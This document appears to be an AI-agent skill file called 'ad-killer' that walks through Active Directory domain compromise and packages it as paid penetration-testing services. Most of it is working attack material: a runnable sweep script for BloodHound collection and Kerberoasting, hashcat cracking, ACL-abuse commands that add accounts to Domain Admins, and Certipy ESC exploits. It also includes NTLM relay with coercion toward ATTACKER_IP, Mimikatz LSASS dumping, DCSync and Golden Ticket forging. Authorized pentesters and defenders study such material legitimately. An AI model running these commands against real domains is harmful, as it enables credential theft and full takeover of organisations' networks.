---
name: ad-killer
description: Use when active Directory and Windows domain exploitation for enterprise
  penetration testing. Use when attacking Windows domains, exploiting AD misconfigurations,
  or performing lateral movement in enterprise environments.
domain: cybersecurity
author: oyi77
license: Apache-2.0
subdomain: general-cybersecurity
tags:
- ad
- active-directory
- cybersecurity
- exploitation
- killer
- lateral-movement
- money
- penetration-testing
- red-team
- security
- testing
- threat-defense
- windows
version: 1.0.0
category: cybersecurity
---


# Ad Killer

## Overview

Compromise Windows Active Directory domains from low-privileged domain user to Domain Admin. Covers the full AD exploitation kill chain: reconnaissance with BloodHound, credential harvesting via Kerberoasting and DCSync, ACL abuse path climbing, ADCS certificate escalation (ESC1-ESC8), and post-exploitation lateral movement across the domain. Every technique maps to MITRE ATT&CK tactics (TA0006 Credential Access, TA0008 Lateral Movement, TA0004 Privilege Escalation).

This skill turns a foothold on one workstation into complete domain compromise, then translates that capability into paid AD penetration testing services for enterprise clients.

## When to Use

**Trigger phrases:**
- "Active Directory penetration test" / "AD security assessment"
- "Domain privilege escalation" / "BloodHound attack path analysis"
- "Kerberoasting / DCSync / ADCS exploitation"
- "Lateral movement in Windows domains"

**Scenarios:**
- Authorized internal pentest against a Windows domain
- Post-exploitation after gaining initial access to a domain-joined workstation
- AD security audit for compliance (PCI DSS 4.0, SOC 2, ISO 27001)
- Purple team exercise validating AD detection controls
- Ransomware simulation — test if AD misconfigurations accelerate lateral spread

## When NOT to Use

- Without signed authorization (ROE document) from the domain owner
- On production domain controllers without prior change management approval
- When the test scope explicitly excludes AD infrastructure
- When you are inside a law enforcement or military AD environment without special written approval
- When the goal is long-term persistence or data theft rather than demonstrating compromise paths

## Money-Making Overview

**Buyer persona:** CISOs and IT directors at mid-market enterprises (200-5,000 employees) who know Active Directory is the backbone of their security but have never had it professionally attacked. These organizations run on AD but have unpatched domain controllers, legacy trusts, weak service account passwords, and misconfigured ACLs. They need to see how a real attacker would move from a workstation to Domain Admin before a ransomware group shows them.

**What they'll pay for:** Technical proof that their AD is (or isn't) resilient against common domain escalation paths. BloodHound attack path maps with supporting evidence, Kerberoastable service account inventory, ADCS ESC findings with Certipy output, and clear fix guidance that IT can action.

**Pricing tiers (service model):**

| Tier | Price | Scope | Deliverable | Timeline |
|------|-------|-------|-------------|----------|
| **AD Health Scan** | $500 | Remote — domain user credentials provided. Run BloodHound collector + automated Impacket checks. No exploitation. | Attack path summary (top 5 risks, 20-path heatmap) + service account hygiene report | 2 days |
| **AD Penetration Test** | $2,500 | On-site or VPN. Start from standard domain user. Full exploitation path including Kerberoasting, AS-REP, ACL abuse, DCSync, ADCS. | Full report with exploit walkthrough videos, BloodHound JSON, evidence zip, remediation plan by severity | 1 week |
| **AD Purple Team** | $5,000 | On-site. Red team emulates APT-style AD attack chain while blue team defends. Includes detection gap analysis. | Executive summary + technical report + MITRE ATT&CK heatmap + detection rule pack (Sigma/Splunk) | 2 weeks |

**First-dollar timeline:** Deliver AD Health Scan within 48 hours of receiving credentials. Use findings as upsell to full Penetration Test. Typical close rate: 40% of Health Scan clients convert within 30 days.

## First Action in 60 Minutes

Run this script from your Kali VM to collect BloodHound data and run initial attack path analysis. It requires domain user credentials (low-privilege is fine) and the domain controller hostname or IP.

```bash
#!/bin/bash
# ad-sweep.sh — BloodHound collection + attack path analysis
# Usage: ./ad-sweep.sh <domain> <dc-ip> <username>
# Example: ./ad-sweep.sh corp.local 192.168.1.10 john

set -euo pipefail

DOMAIN="${1:?Usage: $0 <domain> <dc-ip> <username>}"
DC_IP="${2:?Usage: $0 <domain> <dc-ip> <username>}"
USER="${3:?Usage: $0 <domain> <dc-ip> <username>}"
OUTDIR="ad-report-$DOMAIN-$(date +%Y%m%d-%H%M)"
PASS=""

read -rsp "[?] Password for $DOMAIN\\$USER: " PASS
echo

mkdir -p "$OUTDIR"

# ──────────────────────────────────────────────────────────────
# Phase 1: BloodHound data collection via SharpHound + Python
# ──────────────────────────────────────────────────────────────

echo "[*] Phase 1: Collecting BloodHound data..."

# Option A: SharpHound via Python impacket (no Windows needed)
if command -v bloodhound-python &>/dev/null; then
    echo "[*] Using bloodhound-python..."
    bloodhound-python -d "$DOMAIN" -dc "$DC_IP" -u "$USER" -p "$PASS" \
        -ns "$DC_IP" --dns-tcp -c All --zip -o "$OUTDIR/bloodhound"
fi

# Option B: If SharpHound.exe available (upload to compromised host)
if [ -f ./SharpHound.exe ]; then
    echo "[*] SharpHound.exe found — you can upload and run:"
    echo "    SharpHound.exe -c All --ZipFileName bloodhound.zip"
fi

# ──────────────────────────────────────────────────────────────
# Phase 2: LDAP domain info dump (via ldapsearch / Python)
# ──────────────────────────────────────────────────────────────

echo "[*] Phase 2: LDAP enumeration..."

python3 << PYEOF
import subprocess, json
from ldap3 import Server, Connection, ALL, NTLM

try:
    server = Server("$DC_IP", get_info=ALL, use_ssl=False)
    conn = Connection(server, user="$DOMAIN\\$USER", password="$PASS",
                      authentication=NTLM, auto_bind=True)

    # Get domain info
    conn.search(search_base="DC=$DOMAIN.replace('.',',DC=')",
                search_filter="(objectClass=domain)",
                attributes=["name", "objectSid", "dc", "distinguishedName",
                           "ms-DS-MachineAccountQuota", "lockoutThreshold",
                           "lockoutDuration", "pwdProperties"])
    print("[+] Domain info:", json.dumps(conn.entries[0].entry_attributes_to_values() if conn.entries else {}, indent=2))

    # Get domain admins group members
    conn.search(search_base="CN=Domain Admins,CN=Users," +
                           "DC=$DOMAIN.replace('.',',DC=')",
                search_filter="(objectClass=group)",
                attributes=["member", "name", "distinguishedName", "objectSid"])
    if conn.entries:
        members = conn.entries[0].member.values if conn.entries[0].member else []
        print(f"[+] Domain Admins ({len(members)} members):", json.dumps(members, indent=2))
    else:
        print("[!] Could not retrieve Domain Admins group")

    # Kerberoastable accounts — userAccountControl bits check
    conn.search(search_base="DC=$DOMAIN.replace('.',',DC=')",
                search_filter="(&(objectCategory=person)(objectClass=user)" +
                             "(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                attributes=["sAMAccountName", "servicePrincipalName", "distinguishedName", "userAccountControl"])
    kerberoastable = [e.sAMAccountName.value for e in conn.entries if e.sAMAccountName]
    print(f"[+] Kerberoastable accounts ({len(kerberoastable)}):", json.dumps(kerberoastable, indent=2))

    # AS-REP roastable accounts — UF_DONT_REQUIRE_PREAUTH = 4194304
    conn.search(search_base="DC=$DOMAIN.replace('.',',DC=')",
                search_filter="(&(objectCategory=person)(objectClass=user)" +
                             "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                attributes=["sAMAccountName", "distinguishedName", "userAccountControl"])
    asrep = [e.sAMAccountName.value for e in conn.entries if e.sAMAccountName]
    print(f"[+] AS-REP roastable accounts ({len(asrep)}):", json.dumps(asrep, indent=2))

    conn.unbind()
except Exception as e:
    print(f"[!] LDAP error: {e}")
PYEOF

# ──────────────────────────────────────────────────────────────
# Phase 3: Kerberoasting via Impacket
# ──────────────────────────────────────────────────────────────

echo ""
echo "[*] Phase 3: Kerberoasting..."

impacket-GetUserSPNs -request -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS" \
    -outputfile "$OUTDIR/kerberoast_tgs.txt" 2>&1 | tail -5

if [ -s "$OUTDIR/kerberoast_tgs.txt" ]; then
    echo "[+] Kerberos TGS tickets saved ($(wc -l < "$OUTDIR/kerberoast_tgs.txt") lines)"
else
    # Try with alternate format
    GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request \
        2>/dev/null > "$OUTDIR/kerberoast_tgs.txt"
    echo "[*] Kerberoast attempt complete"
fi

# ──────────────────────────────────────────────────────────────
# Phase 4: CrackMapExec quick domain assessment
# ──────────────────────────────────────────────────────────────

echo ""
echo "[*] Phase 4: Quick domain assessment with CrackMapExec..."

crackmapexec smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
    --shares 2>/dev/null | tee "$OUTDIR/cme_shares.txt"

crackmapexec smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
    --sessions 2>/dev/null | tee "$OUTDIR/cme_sessions.txt"

# Check for SMB signing
crackmapexec smb "$DC_IP" 2>/dev/null | tee "$OUTDIR/cme_signing.txt"

# ──────────────────────────────────────────────────────────────
# Phase 5: BloodHound path analysis (require neo4j running)
# ──────────────────────────────────────────────────────────────

echo ""
echo "[*] Phase 5: BloodHound attack path analysis..."

if command -v bloodhound-analytics &>/dev/null; then
    # Try to find BH zip
    BH_FILE=$(find "$OUTDIR" -name "*.zip" | head -1)
    if [ -n "$BH_FILE" ]; then
        echo "[*] Running Analytics in DB..."
        bloodhound-analytics -db "$BH_FILE" 2>/dev/null || true
    fi
fi

# ──────────────────────────────────────────────────────────────
# Summary
# ──────────────────────────────────────────────────────────────

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  AD SWEEP COMPLETE                                          ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Output directory: $OUTDIR"
echo ""
echo "Next steps (priority order):"
echo "  1. Crack captured Kerberos tickets: hashcat -m 13100 $OUTDIR/kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt"
echo "  2. Import BloodHound ZIP into neo4j and run shortest path queries from your user to DOMAIN ADMINS"
echo "  3. Check for privileged session attacks (BloodHound: shortest path to high-value targets)"
echo "  4. Enumerate ACL abuse paths: python3 scripts/check-acl-abuse.py (see Deliverable Format below)"
echo "  5. If ADCS detected, run Certipy for ESC1-ESC8: certipy find -u USER@domain -p PASS -dc-ip DC_IP"
echo ""
```

**What to do next:** Import the BloodHound ZIP file from `$OUTDIR/bloodhound/` into the BloodHound CE GUI (ensure neo4j is running). Run these Cypher queries immediately:

```cypher
// Shortest paths from owned users to Domain Admins
MATCH p=shortestPath((n)-[:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|WriteDACL|WriteOwner|Owns|ForceChangePassword|AddMember|Contains|GpLink|AllowedToDelegate|TrustedBy|CanRDP|ExecuteDCOM*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p

// Find kerberoastable users with shortest path
MATCH (u:User {hasspn:true}) RETURN u.name, u.samaccountname

// Find AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.samaccountname

// Find all users with admin sessions on high-value targets
MATCH (u:User)-[:HasSession]->(c:Computer)-[:AdminTo|MemberOf|Contains|GpLink*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN u.name, c.name
```

Follow each path to its root cause (an ACL permission, a group membership, a session), document the evidence, and add it to the deliverable report.

## Prerequisites

- **Kali Linux** or Parrot OS with: `impacket`, `bloodhound-python`, `neo4j`, `crackmapexec`, `hashcat`, `ldap3` (Python)
- **Domain credentials** (low-privilege domain user account — you don't need admin rights to enumerate most AD attack paths)
- **Network access** to domain controller on ports 389 (LDAP), 88 (Kerberos), 445 (SMB)
- **Python packages:** `ldap3`, `bloodhound`, `impacket` (`pip install ldap3 bloodhound impacket`)
- **BloodHound CE** and neo4j (for graph analysis)
- **Tools to have on hand:** `Certipy` (ADCS), `Rubeus` (Kerberos), `Mimikatz` (LSASS), `PKINITtools` (Kerberos PKINIT)

## Tools

| Tool | Purpose | Kali Package |
|------|---------|-------------|
| **BloodHound-Python** | BloodHound collector without Windows | `bloodhound.py` (pip) |
| **Impacket** | Kerberoasting, DCSync, PSExec, WMIExec | `impacket-scripts` |
| **CrackMapExec** | SMB/RDP/WMI/LDAP assessment | `crackmapexec` |
| **Certipy** | ADCS exploitation (ESC1-8) | `certipy-ad` (pip) |
| **ldap3** | Python LDAP queries | `python3-ldap3` |
| **hashcat** | GPU-accelerated password cracking (RTX 2060 SUPER) | `hashcat` |
| **neo4j** | BloodHound graph database | `neo4j` |
| **Rubeus** | Kerberos ticket manipulation | Upload to target |
| **Mimikatz** | LSASS credential extraction | Upload to target |
| **PKINITtools** | Kerberos PKINIT / AS-REP with PKCS12 | pip / upload |

## Workflow

### Phase 1: Reconnaissance & Collection

1. **Enumerate domain** — Query LDAP for domain info, users, groups, computers, trusts, GPOs, OUs
2. **Collect BloodHound data** — Run `bloodhound-python -c All` to gather nodes and edges
3. **Identify low-hanging fruit** — Check for null sessions, anonymous LDAP binds, SMB null sessions
4. **Enumerate Kerberos** — Dump SPNs for Kerberoast candidates, flag accounts without pre-auth (AS-REP)
5. **Check ADCS** — Run `certipy find` to map certificate templates and ESC vulnerabilities
6. **Map trusts** — Enumerate inter-forest and intra-forest trusts, SID filtering status

### Phase 2: Credential Access

1. **Kerberoast** — `impacket-GetUserSPNs -request` to dump TGS tickets for offline cracking
2. **AS-REP Roast** — `impacket-GetNPUsers` against accounts without pre-auth
3. **Crack hashes** — `hashcat -m 13100 kerberoast_tgs.txt rockyou.txt` (RTX 2060 SUPER: ~20GH/s on NTLM, ~200kH/s on Kerberos TGS)
4. **Password spraying** — Test cracked passwords across other accounts via `crackmapexec smb`
5. **DCSync** — If you have Domain Admin or Replicating Directory Changes rights: `impacket-secretsdump -just-dc DOMAIN/USER@DC_IP`

### Phase 3: Privilege Escalation (Attack Path Climbing)

For each attack path found by BloodHound, execute the corresponding technique:

| BloodHound Edge | Technique | Command |
|---|---|---|
| `ForceChangePassword` | Reset user password | `net user /domain /active:yes TARGET Passw0rd!` |
| `GenericAll` | Full control of object | `add-member -Member TARGET -Group "Domain Admins"` or cert template abuse |
| `WriteDACL` | Grant self DCSync rights | `Add-ADDCRight -Identity Attacker-ADUser -ExtendedRight DS-Replication-Get-Changes` |
| `WriteOwner` | Take ownership | `Set-DomainObjectOwner -Identity TargetGroup -OwnerIdentity Attacker` |
| `AddMember` | Add to privileged group | `net group "Domain Admins" ATTACKER /add` |
| `AdminTo` | Local admin on target | `impacket-psexec DOMAIN/USER@TARGET` |
| `HasSession` | Credential theft via token | `Mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` |
| `AllowedToDelegate` | Constrained delegation abuse | `impacket-getST -spn cifs/TARGET DOMAIN/USER` |
| `AddKeyCredentialLink` | Shadow Credentials | `pywhisker -d DOMAIN -u USER -p PASS -t TARGET -a add` |
| `AddSelf` | Self-membership escalation | `net group "Domain Admins" ATTACKER /add` |

### Phase 4: ADCS Exploitation (if Certificate Services present)

```bash
# Find vulnerable templates
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -stdout

# ESC1 — Low-priv user can enrol in a template that issues as domain admin
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CA-SERVER -template ESC1TEMPLATE -upn "administrator@$DOMAIN"

# ESC2/3 — Template allows any purpose (Any Purpose) + enrolment rights
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CA-SERVER -template ESC2TEMPLATE

# ESC4 — Low-priv user has WriteOwner/WriteDACL on certificate template
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template VULN_TEMPLATE -save-old

# ESC8 — NTLM relay to AD CS Web Enrollment via Coercion
ntlmrelayx.py -t "http://CA-SERVER/certsrv/certfnsh.asp" -smb2support --adcs
# In another window: PrinterBug coercion against target DC
dementor.py -d DOMAIN -u USER -p PASS ATTACKER_IP TARGET_DC
```

### Phase 5: Lateral Movement & Full Compromise

1. **Use cracked credentials** — Spray across domain-joined machines via `crackmapexec`
2. **Dump LSASS** — Remote Minidump or Mimikatz via WMI/SMB
3. **Extract krbtgt hash** — `impacket-secretsdump -just-dc DOMAIN/ADMIN@DC_IP`
4. **Golden Ticket** — `Mimikatz "kerberos::golden /domain:DOMAIN /sid:S-1-5-... /krbtgt:HASH /user:Administrator /ptt"`
5. **Silver Ticket** — Forge service-specific TGS for any machine
6. **DCSync** — Extract all domain hashes in one command
7. **SID History Injection** — Add enterprise admin SID to cross-forest trust

## Deliverable Format

When delivering an AD penetration test report to a client, use this template:

```
╔══════════════════════════════════════════════════════════════════════╗
║                  ACTIVE DIRECTORY SECURITY ASSESSMENT                ║
║                     [Client Name] — [Date Range]                    ║
║                        Tier: [Health Scan / Pentest / Purple]       ║
╚══════════════════════════════════════════════════════════════════════╝

1. EXECUTIVE SUMMARY
   ┌─────────────────────────────────────────────────────────────────┐
   │ Started from: DOMAIN\lowprivuser                                │
   │ Achieved:      DOMAIN\Administrator (domain compromise)          │
   │ Time to DA:    4.2 hours                                        │
   │                                                                  │
   │ Attack chain:                                                   │
   │   1. LDAP enumeration -> found Kerberoastable service account    │
   │   2. Cracked SPN hash (hashcat, 12 mins)                        │
   │   3. Service account had GenericAll on HR group                  │
   │   4. HR group member had WriteDACL on Domain Admins              │
   │   5. Added Replication rights -> DCSync -> full domain hash dump │
   │                                                                  │
   │ Risk rating: CRITICAL                                            │
   └─────────────────────────────────────────────────────────────────┘

2. SCOPE
   Domain:          corp.example.com
   Domain Controllers: DC01 (192.168.1.10), DC02 (192.168.1.11)
   Forest:          corp.example.com
   AD Functional Level: Windows Server 2016
   Starting access: Standard domain user (john.doe)

3. ATTACK PATH SUMMARY (top 5)
   ┌──────┬──────────────────────────────────────┬──────────┬──────────┐
   │  #   │ Path Description                     │ Steps    │ Risk     │
   ├──────┼──────────────────────────────────────┼──────────┼──────────┤
   │  1   │ Kerberoast -> svc_sql -> GenericAll   │     3    │ CRITICAL │
   │  2   │ AS-REP -> backup_user -> AdminTo DC01 │     2    │ CRITICAL │
   │  3   │ ESC1 certificate template abuse       │     2    │ HIGH     │
   │  4   │ Constrained delegation on svc_iis     │     3    │ HIGH     │
   │  5   │ DCOM lateral to admin workstation     │     4    │ MEDIUM   │
   └──────┴──────────────────────────────────────┴──────────┴──────────┘

4. BLOODHOUND ATTACK PATH ANALYSIS

   Path #1 — Kerberoasting to Domain Admin (steps 3)
   -------------------------------------------
   [user: john.doe] --MemberOf--> [group: Domain Users]
   [user: john.doe] --HasSession--> [computer: WORKSTATION42]
   [computer: WORKSTATION42] --AdminTo--> [computer: SQLSRV01]
   [user: svc_sql_agent] --HasSession--> [computer: SQLSRV01]
   [user: svc_sql_agent] --MemberOf--> [group: SQL Admins]
   [group: SQL Admins] --GenericAll--> [group: HR Admins]
   [user: hr_admin] --MemberOf--> [group: HR Admins]
   [user: hr_admin] --WriteDACL--> [group: Domain Admins]
   [group: Domain Admins] --Contains--> [user: Administrator]

   Remediation: Remove GenericAll between SQL Admins and HR Admins.
   Rotate svc_sql_agent password (last changed 2022-03-14).

5. SERVICE ACCOUNT HYGIENE
   ┌─────────────────────┬────────┬──────────┬──────────┬────────────┐
   │ Account             │ SPNs   │ Last Pwd │ Cracked? │ Risk Score │
   ├─────────────────────┼────────┼──────────┼──────────┼────────────┤
   │ svc_sql_agent       │   3    │ 2022-03  │   YES    │    9.5     │
   │ svc_backup          │   1    │ 2023-01  │   YES    │    8.0     │
   │ svc_iis_pool        │   5    │ 2024-06  │    NO    │    4.0     │
   │ SRV_JOIN$           │   1    │ 2024-11  │    NO    │    2.0     │
   └─────────────────────┴────────┴──────────┴──────────┴────────────┘

   Total Kerberoastable accounts: 14
   Accounts cracked within 1 hour (rockyou.txt): 3

6. ADCS FINDINGS
   ┌──────┬──────────┬────────────────────────────────────┬────────────┐
   │  #   │ ESC ID   │ Template / Issue                   │ Severity   │
   ├──────┼──────────┼────────────────────────────────────┼────────────┤
   │  1   │ ESC1     │ CorpCertTemplate (enrol: domain     │ CRITICAL   │
   │      │          │ users, EKU: client auth, SAN: edit) │            │
   │  2   │ ESC3     │ CorpEnrollmentAgent                 │ HIGH       │
   │  3   │ ESC8     │ Web enrollment NTLM relay           │ CRITICAL   │
   │  4   │ ESC10    │ Weak certificate mapping            │ MEDIUM     │
   └──────┴──────────┴────────────────────────────────────┴────────────┘

7. TRUST RELATIONSHIPS
   ┌──────────────────────┬──────────┬────────────────────────────────┐
   │ Trust Name           │ Type     │ Risk Assessment                │
   ├──────────────────────┼──────────┼────────────────────────────────┤
   │ corp.example.com     │ Parent   │ SID filtering DISABLED         │
   │   -> ad.acquirer.com │          │ Possible SIDHistory injection  │
   │                      │          │ to escalate to Enterprise Auth │
   └──────────────────────┴──────────┴────────────────────────────────┘

8. RECOMMENDATIONS (by priority)
   ┌──────┬────────────────────────────────────────┬──────────┬────────┐
   │  #   │ Action                                 │ Severity │ Cost   │
   ├──────┼────────────────────────────────────────┼──────────┼────────┤
   │  1   │ Rotate svc_sql_agent password now      │ CRITICAL │ 15 min │
   │  2   │ Disable ESC1 template CorpCertTemplate │ CRITICAL │ 10 min │
   │  3   │ Enable SID filtering on corp->acquirer │ HIGH     │ config │
   │  4   │ Audit service account ACL delegation   │ HIGH     │ 1 hour │
   │  5   │ Deploy LAPS on all workstations        │ MEDIUM   │ 2 days │
   │  6   │ Implement tiered admin model (ESAEA)   │ MEDIUM   │ 2 wks  │
   │  7   │ Enable advanced audit policies + Sysmon │ MEDIUM  │ 1 day  │
   │  8   │ Run quarterly Kerberoast audit         │ LOW      │ 30 min │
   └──────┴────────────────────────────────────────┴──────────┴────────┘

9. APPENDIX
   A. Raw Kerberos TGS tickets (encrypted)
   B. BloodHound JSON graph data
   C. Certipy full output
   D. Cracked password evidence (hashes only, not plaintext)
   E. Complete Impacket log output
   F. Detection rules (Sigma format for Splunk/Sentinel)

LABOR SUMMARY
   Recon & collection:    2.5 hours
   Attack path analysis:  4.0 hours
   ADCS assessment:       2.0 hours

PAYMENT: USDC / Wire / ACH (net 15)
```

## Verification

- [ ] BloodHound collector completed with all nodes/edges enumerated and domains mapped
- [ ] Kerberoastable accounts identified and TGS tickets captured; AS-REP roastable accounts flagged
- [ ] ADCS CA(s) found and templates enumerated with Certipy
- [ ] At least one (or documented zero) attack path from starting user to Domain Admin
- [ ] DCSync executed to confirm domain compromise
- [ ] Every exploit step captured with timestamped evidence (screenshots/logs)
- [ ] Recommendations are specific, actionable, and sorted by impact
- [ ] No persistence mechanisms left in client environment; credentials handled per ROE
- [ ] Report includes raw data appendix for client review

## Anti-Rationalization Table

| Rationalization | Reality |
|---|---|
| "We use strong passwords, so Kerberoasting won't work" | Kerberoasting cracks the service account password, not the user's. Most service accounts have auto-generated 20-char passwords set once and never changed for years — and often those passwords ARE in rockyou.txt because the AD installer used a default pattern. |
| "We have MFA, so credential theft is useless" | MFA protects interactive logon. Kerberos tickets and NTLM hashes are reusable offline — attackers don't need MFA to reuse a stolen ticket. DCSync extracts password hashes without triggering any login event. |
| "Our AD is patched, so we're immune to these attacks" | AD attacks are 90% configuration abuse, not unpatched CVEs. Kerberoasting, ACL abuse, ADCS misconfigurations (ESC1-8), and delegation abuse all work on fully patched 2025 domain controllers. |
| "We isolated AD from the internet — internal attacks are unlikely" | Ransomware groups routinely enter via VPN, email phishing, or third-party vendor access. Once inside, they are internal. 80% of breaches involve AD credential abuse from inside the network. |
| "BloodHound is just for red teams; we don't need it" | BloodHound was designed as a defense tool. Running it proactively shows you the same attack paths an adversary would find. Ignorance is not security — the paths exist whether you look or not. |
| "Service accounts don't matter — they aren't interactive users" | A Kerberoasted service account with GenericAll on an OU is effectively Domain Admin. Automated service accounts often have wildly excessive ACL permissions because nobody traces delegation chains. |
| "Our domain is only 200 users — we can't be a target" | Small domains are common targets because they lack dedicated AD security staff. The techniques scale down perfectly: a 200-user domain has the same Kerberos, the same ACLs, and often more dangerous one-person-IT overprivilege. |
| "We use Azure AD, no on-prem AD to attack" | Hybrid environments sync password hashes via AAD Connect. The on-prem AD Connect server has a privileged account that can compromise the cloud. PTA/gMSA abuse on hybrid identity bridges on-prem to cloud. |